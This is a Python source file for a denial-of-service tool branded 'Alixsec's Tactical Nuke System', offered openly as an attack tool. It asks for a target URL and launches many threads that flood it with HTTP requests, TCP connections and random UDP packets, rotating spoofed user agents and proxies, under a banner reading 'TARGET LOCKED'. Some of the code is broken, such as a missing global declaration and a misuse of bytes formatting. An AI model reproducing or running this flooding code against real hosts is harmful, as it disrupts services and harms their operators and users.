#Made By Alixsec
import socket
import threading
import random
from time import sleep
from rich.console import Console
from rich import print
from urllib.parse import urlparse
from colorama import Fore


console_output = Console()


target_host = ""
target_port = 0
attack_level = 20
request_delay = 0.01  
successful_attacks = 0
failed_attacks = 0
user_agents = []
proxies = []  
headers = []  


search_urls = [
    # Search Engines
    "http://www.google.com/search?q=", "http://www.bing.com/search?q=", "http://www.baidu.com/s?wd=",
    "http://www.yahoo.com/search?p=", "http://www.yandex.com/search?text=", "http://duckduckgo.com/?q=",
    "http://www.ask.com/web?q=", "http://search.aol.com/aol/search?q=", "http://www.ecosia.org/search?q=",
    "http://www.lycos.com/web?q=",

    # Social Media Bots
    "http://www.facebook.com/search/top?q=", "http://www.instagram.com/web/search/topsearch/?context=blended&query=",
    "http://twitter.com/search?q=", "http://www.linkedin.com/search/results/all/?keywords=",
    "http://t.me/s/",  # Telegram search
    "http://www.reddit.com/search/?q=", "http://www.pinterest.com/search/?q=", "http://vk.com/search?c[q]=",
    "http://www.tumblr.com/search?q=", "http://weibo.com/search?q=", "http://mix.com/search?q=",

    # News Bots
    "http://www.nytimes.com/search?query=", "http://www.theguardian.com/search?q=", "http://www.bbc.co.uk/search?q=",
    "http://www.cnn.com/search/?q=", "http://www.nbcnews.com/search/?q=", "http://www.foxnews.com/search-results/search?q=",
    "http://www.reuters.com/search/news?blob=", "http://www.aljazeera.com/Search/?q=", "http://www.huffpost.com/search?q=",
    "http://www.bloomberg.com/search?q=", "http://www.forbes.com/search/?q=",

    # E-commerce Crawlers
    "http://www.amazon.com/s?k=", "http://www.ebay.com/sch/i.html?_nkw=", "http://www.alibaba.com/trade/search?SearchText=",
    "http://www.flipkart.com/search?q=", "http://www.walmart.com/search/?query=", "http://www.etsy.com/search?q=",
    "http://www.shopify.com/search?q=", "http://www.bestbuy.com/site/searchpage.jsp?st=", "http://www.target.com/s?searchTerm=",
    "http://www.newegg.com/p/pl?d=", "http://www.mercadolibre.com/jm/search?q=",

    # Streaming/Video Bots
    "http://www.youtube.com/results?search_query=", "http://vimeo.com/search?q=", "http://www.dailymotion.com/search/",
    "http://www.twitch.tv/search?term=", "http://www.netflix.com/search?q=",

    # Music Search Bots
    "http://open.spotify.com/search/", "http://soundcloud.com/search?q=", "http://www.apple.com/itunes/search/?q=",
    "http://www.pandora.com/search?q=",

    # Map Search Bots
    "http://maps.google.com/maps?q=", "http://www.bing.com/maps?q=", "http://maps.yahoo.com/#q=",
    "http://www.openstreetmap.org/search?query=",

    # Torrent Search Bots
    "http://www.thepiratebay.org/search/", "http://www.1337x.to/search/", "http://www.rarbg.to/torrents.php?search=",
    "http://yts.mx/browse-movies/", "http://torrentz2.is/search?q=",

    # Crawler & Analytics Bots
    "http://www.similarweb.com/website/", "http://moz.com/researchtools/ose/links?site=", "http://majestic.com/reports/site-explorer?q=",
    "http://www.alexa.com/siteinfo/", "http://uptime.com/check?host=", "http://validator.w3.org/check?uri=",
    "http://whois.domaintools.com/", "http://www.geopeeker.com/fetch/?url=",

    # Academic Search Bots
    "http://scholar.google.com/scholar?q=", "http://www.jstor.org/action/doBasicSearch?Query=",
    "http://ieeexplore.ieee.org/search/searchresult.jsp?queryText=", "http://pubmed.ncbi.nlm.nih.gov/?term=",

    # Code Repositories
    "http://github.com/search?q=", "http://bitbucket.org/search?q=", "http://gitlab.com/search?search=",
    "http://sourceforge.net/directory/?q=",

    # Other Crawlers
    "http://www.archive.org/", "http://validator.nu/?doc=", "http://downforeveryoneorjustme.com/", "http://www.traceroute.org/",
    "http://www.sslshopper.com/ssl-checker.html#hostname=", "http://www.webpagetest.org/?url=",
]


def generate_user_agents():
    global user_agents
    user_agents = [        
    # Windows User Agents
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
    "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
    "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",

    # Macintosh User Agents
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",

    # Opera User Agents
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",

    # Android User Agents
    "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
    "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 # I will add more Later
]


def load_proxies():
    global proxies
    with open("proxy.txt", "r") as file:
        proxies = [line.strip() for line in file.readlines() if line.strip()]

def load_headers():
    global headers
    with open("header.txt", "r") as file:
        headers = [line.strip() for line in file.readlines() if line.strip()]

def configure_attack():
    global target_host, target_port, attack_level, request_delay
    target_url = input("Enter target URL (e.g., https://example.com or http://example.com): ").strip()
    parsed_url = urlparse(target_url)
    target_host = parsed_url.hostname

    if parsed_url.scheme == "https":
        target_port = 443
    else:
        target_port = 80

    attack_level_input = input(f"Enter attack level (default {attack_level}): ").strip()
    if attack_level_input:
        attack_level = int(attack_level_input)

    request_delay = 0.01  # Faster attack for maximum load

def execute_attack():
    configure_attack()
    generate_user_agents()
    load_proxies()
    load_headers()
    print(f"Target: {target_host}, Port: {target_port}, Attack Level: {attack_level}")

def attack_worker():
    for i in range(attack_level):
        proxy = random.choice(proxies) if proxies else None

        # HTTP thread attack
        http_thread = threading.Thread(target=http_flood, args=(proxy,))
        http_thread.daemon = True
        http_thread.start()

        # SYN flood thread
        syn_thread = threading.Thread(target=syn_flood, args=(proxy,))
        syn_thread.daemon = True
        syn_thread.start()

        # UDP flood thread
        udp_thread = threading.Thread(target=udp_flood, args=(proxy,))
        udp_thread.daemon = True
        udp_thread.start()

def http_flood(proxy=None):
    global successful_attacks
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if proxy:
                proxy_ip, proxy_port = proxy.split(':')
                sock.connect((proxy_ip, int(proxy_port)))
            else:
                sock.connect((target_host, target_port))
            header = random.choice(headers) if headers else "User-Agent: " + random.choice(user_agents)
            sock.send(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n{header}\r\n\r\n".encode())
            sock.close()
            successful_attacks += 1
    except Exception as e:
        failed_attacks += 1

def syn_flood(proxy=None):
    global successful_attacks
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((target_host, target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_host.encode()))
            sock.close()
            successful_attacks += 1
    except Exception as e:
        failed_attacks += 1

def udp_flood(proxy=None):
    global successful_attacks
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            message = random._urandom(1024)
            sock.sendto(message, (target_host, target_port))
            successful_attacks += 1
    except Exception as e:
        failed_attacks += 1

# Banner for the attack system
banner = f"""
    {Fore.RED}***************************************************
    {Fore.YELLOW}      ╔════════════════════════════════════╗
    {Fore.YELLOW}      ║    Alixsec's Tactical Nuke System  ║
    {Fore.YELLOW}      ║          MISSILE  v2.0             ║
    {Fore.YELLOW}      ║         FREE PALESTINE!            ║
    {Fore.YELLOW}      ╚════════════════════════════════════╝

    {Fore.GREEN}                __       __       __       __
    {Fore.RED}              /  ╦>{Fore.YELLOW}   / ╦>{Fore.GREEN}   / ╦>{Fore.YELLOW}   / ╦>
    {Fore.RED}             /____╩>{Fore.YELLOW} /___╩>{Fore.GREEN} /___╩>{Fore.YELLOW} /___╩>
    
    {Fore.RED}     ╔═══════════════════════════╗
    {Fore.RED}     ║       TARGET LOCKED       ║
    {Fore.RED}     ╚═══════════════════════════╝

    {Fore.GREEN}     >>> OBLITERATION BEGINS NOW <<<    
    {Fore.YELLOW}***************************************************
"""

console_output.print(banner, style="bold")

# Main execution starts
if __name__ == "__main__":
    execute_attack()
    attack_worker()
